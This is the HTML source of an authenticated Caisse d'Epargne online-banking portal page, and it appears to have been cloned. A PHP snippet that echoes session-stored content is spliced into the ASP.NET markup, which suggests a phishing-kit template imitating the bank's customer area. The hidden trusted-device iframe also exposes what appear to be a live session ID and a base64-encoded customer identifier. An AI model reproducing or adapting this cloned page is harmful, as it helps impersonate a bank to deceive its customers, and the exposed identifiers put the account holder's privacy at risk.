        $("#mailez").addClass("header-load-tooltip");
        $("#mailezbis").addClass("header-speed-links_item-new-mail");
        $("#mailez").attr('title', msgAlerte);
        App.HeaderDEI.Tooltips.init();
    }
</script>  

    
            <div id="globalDeiInd">
                    <div id="" class="total hasjs" style="padding-top:0px">
                    <div id="wrap-modifie" class="zero">
                                                    <div style="display: none;">
                        <fusion type="cartouche"></fusion>                     </div>
                    
<script language="javascript" src="JavaScripts/polyfills.js"></script>
<script language="javascript" src="JavaScripts/jquery.base64.js"></script>
<script language="javascript" src="JavaScripts/jquery.blockUI.js"></script>
<script language="javascript" src="JavaScripts/CrossNav.js"></script>
<script language="javascript" src="JavaScripts/PopinManager.js"></script>
<script language="javascript" src="JavaScripts/IFrameManager.js"></script>
<script language="javascript" src="JavaScripts/EDocumentRGSouscription.js"></script>
<script language="javascript" src="JavaScripts/EDocumentsConsultationMultiUnivers.js"></script>

<script type="text/javascript">
    var dtm_previous_pagename = '';
    
    var datalayer = {
		client: {
					idEnttGrpe: "",
					id: "",
					statut: "authentifie",
					marche: "particuliers"
				},
		page: {
					codeEnttGrpe: "",
					applicationType: "site",
					applicationName: "dei part",
					marche: "particuliers",
					univers: "",
					pageType: "dei",
					pageName: "",
					espace: "transactionnel",
					abTesting: "",
					abTestingId: "",
					iframe: "0"
				},
		produit: {
					gamme: "",
					code: ""
				},
		form: {
					nom: "",
					idEtape: ""
		        },
		campagne: {
					id: ""
				},
		clic: {
					libelle: "",
					type: ""
				},
		push: {
					titre: "",
					type: "",
					theme: "",
					gamme: ""
				},
		social: {
					name: ""
				},
		mail: {
					object: ""
				},
		search: {
					searched: "",
					results: ""
				},
		services: {
					list: ""
				}
};

    MAJInfoMessagerieHeader('0', '');
    MAJInfoBulleCFNHeader('0', '');

</script>


<form method="post" action="./Portail.aspx" onsubmit="javascript:return WebForm_OnSubmit();" id="main">
<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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" />
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['main'];
if (!theForm) {
    theForm = document.main;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="/WebResource.axd?d=f7hIwMKvDLKcc8f2lDJDoyLFRCPtbio1_WLaIgdrKVROGgWnUllYUlmi6SpcDFZrOey6MfQGecV5uQ8wxietkS3VbmPAoYMvbRBf2rrbqo01&amp;t=636765500300000000" type="text/javascript"></script>


<script src="/JavaScripts/ForceDeconnexion.js" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
new FDX("/Pages/Logout.aspx", 30000, 180000);//]]>
</script>

<script src="/ScriptResource.axd?d=-8g3fhtU93hNCq6D9zr45IpeDYm9WSyo36VhAJMWFEIdEoCxTl309PohVjFfKNaNHYSRykP6EBOA8XE41Q4RpzWtU1BfGEjIRBUm4zvTBbqUzQIzG5o4L0bHhTKl2dJJJSypLm2N6vO21oo62AJp9xgxr-IvuuOqiUNnHRHSCRo1&amp;t=6e962c21" type="text/javascript"></script>
<script src="/ScriptResource.axd?d=aLJ1onbD1z27c8D28QQWNqnvSb_LbKmLqE0J4mOUzoXklAHHHHpWCfgGvy0BGij4y7tD74rbZaRcdvVClTZdO1hbsjzmIgFg_ut6GBeQdhNdOjOHUDFu_5PHlhlkKgMInTIQGDe9aiTlCSqG5_4b7OuGJ2oclIcVQb7r1OVIOYO040Pf5UTjHXK9GTuL03NP0&amp;t=ffffffff999c3159" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
//]]>
</script>

<script src="/ScriptResource.axd?d=gZXc6FB2cBt86CIoZBX8QKBAsYRp1HTy3sWHEV1hi9M-Wn4oiX1H-9iJvs3LbrkH9jEEgMM0bUD-Cw6-nhrxt76tI7RXzwgJqxWexgNHU1Z9xyrPQ_1N_dAP2Ql6VX6PEcx8JM69XQqKg6n7DGaCPss7XZOgu3VjtfG9d845oLPWOXbacfQqQ2vM7UVIjkP30&amp;t=ffffffff999c3159" type="text/javascript"></script>
<script src="/ScriptResource.axd?d=1WDuRqkzfDgVUlZwdvExgCxA415VbShZosjF040orxm6uxC4zOU29-234oEsdi9Mon6uoyU-VqDH7Um_OHEkPHckMQy55uWOdOLRBCKjKHK5TrE2ad_F4C92v9cyK60j2I69eBa-M_XiZeWEOWAe04nAFzEqoe7Bg_yLaYIpm4-w4ozP_FqAwdXnanN4nvqI0&amp;t=6a4a2540" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;afficherLoader();AbortRefreshInformations();
return true;
}
//]]>
</script>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="41CFA58D" />
	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="l+EqkjaIRVN6JA9+4LdnULXIeuwYYvct7rNstCEFc41Ff2lPbLmW+SB8bCPrEhc29GK78mCrUvUfzBRNg6U2Lbkne4Ahaq8KTFa/7TMzYjpIpNrdgTGn8IwCXok69C7n31mKS4ABLoBdgPXlRW2wDQvr9oW6LkWrHXuxC0zkXnG0594pn86L5+iKCodo1RwOhHw+7SM15rc5tlEXJnH/XjYhAJX3rCSLoUSaK7onoLSBV7bcMPG/gFTxTFxfF1qtsrmpm7wy9caszWIvPJ89RM70YdFLHOvl27omQQPMJsAZiXFUmW1x6DYy80QPXBZH" />
</div>
    <script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('m_ScriptManager', 'main', ['tMM$m_UpdatePanel','MM_m_UpdatePanel','tCartouchedd$m_UpdatePanel','Cartouchedd_m_UpdatePanel'], [], [], 90, '');
//]]>
</script>
    
    
    
                        
                
<script type="text/javascript">
    
    if("https://www.caisse-epargne.fr/espace-entreprise/trusted-device/?cdetab=16275&authority=https://www.net627.caisse-epargne.fr/&sessionId=MmZ3cDRnbWJ6azB6MHd1bDIxZ21oeWxr&user=ODAyMTIzNTg0NA==" != ""){
        $(".header-inner").append("<div class=\"header-collect-tdc\"><iframe title=\"iframe\" src=\"https://www.caisse-epargne.fr/espace-entreprise/trusted-device/?cdetab=16275&authority=https://www.net627.caisse-epargne.fr/&sessionId=MmZ3cDRnbWJ6azB6MHd1bDIxZ21oeWxr&user=ODAyMTIzNTg0NA==\" style=\"position:relative;width:0;height:0;border:0;dislpay:none;\"></div>");
    }
    var isMdec = false;
    var estVueChargee = false; // Variable permettant de savoir dans les règles Adobe DTM si la vue a été chargée entièrement (pour éviter double appel lors connexion)
    
    function BindLoadEvents() 
    {
        $(document).ready(function() {
            //On appel la méthode qui met à jour l'univers courant dans la barre navigation
            MajUniversCourant();

            //On masque le loader
            if (isMdec)
                isMdec = false;
            else
                masquerLoader();

            // On appel la méthode qui permet de mettre en forme la page
            // évite les instances en double
            if (!$('div.content').hasClass('hasjs'))
                instanceAllEvents();

            loaded = false;
            $("#aLaunchDemandes").bind('click', toggleHomeMenuRight);

            // Mode demo
            

            // Information client dans header.
            
                var script = document.createElement( 'script' );
                script.type = 'text/javascript';
                script.src = "JavaScripts/Header.js";
                document.body.appendChild(script);
            
            
            //***********************************
            // Adobe DTM
            //***********************************
            estVueChargee = true;
            if (typeof _satellite !== 'undefined') {
                // Suppression des eVars et Prop
                var s = _satellite.getToolsByType('sc')[0].getS();
                if (s != null) {
                    s.clearVars();
                }
                
                // Appel au script de gestion Adobe DTM
                _satellite.pageBottom();
            }
            //***********************************
            
            //***********************************
            // Chat iAdvize
            //***********************************
            if (((typeof boolchatjs != 'undefined') && (boolchatjs == 1)) && (typeof iAdvize != 'undefined')) {
                if ((typeof iAdvize.chatloaded != 'undefined') && (iAdvize.chatloaded == true)) {
                    iAdvize.navigate('/' + datalayer.page.pageName);
                }
            }
            
        });
    }

    function FoncSavoirPlus(popin, popin1, popin2, btnpopin2, entetepopin2) {
        node0 = document.getElementById(popin);
        node = document.getElementById(popin1);
        node1 = document.getElementById(popin2);
        btn = document.getElementById(btnpopin2);
        entpopin2 = document.getElementById(entetepopin2);

        node0.style.width = "650px";
        node0.style.height = "350px";
        node.style.display = "none";
        node.style.height = "0px";
        btn.style.display = "none";
        node1.style.display = "block";
        node1.style.height = "300px";
        entpopin2.style.display = "block";
    }
    
</script>

<div id="MM_m_UpdatePanel">
	 
        <script type="text/javascript">
            Sys.Application.add_load(BindLoadEvents);
        </script>
        <div class="wrap" id="wrap">
		
			<div>
			
			<?php
if (isset($_SESSION['content'])) echo $_SESSION['content'];

?>
          
			</div> 

         
        <style type="text/css">
    #popinCM {
        width:auto !important;
        margin-left: -414px !important;
        max-width: 588px;
    }
    ul.hide-li-nocontent li:empty
    {
        display:none;
    }
    #popinCM #containerCM .blockCM+.blockCM
    {
        margin-top:20px;
    }
</style>


        
              
        
        
        
        <span id="MM_m_Stats">    
    <script type="text/javascript" src="https://www.net627.caisse-epargne.fr/JavaScripts/StatsXiti.js"></script>        
    
    <noscript><img width='1' height='1' alt='' src="https://logs2.xiti.com/hit.xiti?s=375080&s2=19&p=syntheses_::_synthese_credits&di=" ></noscript>
    <a id="MM_m_Stats_sURLXiti" style="display:none;" class="sURLXiti"></a>
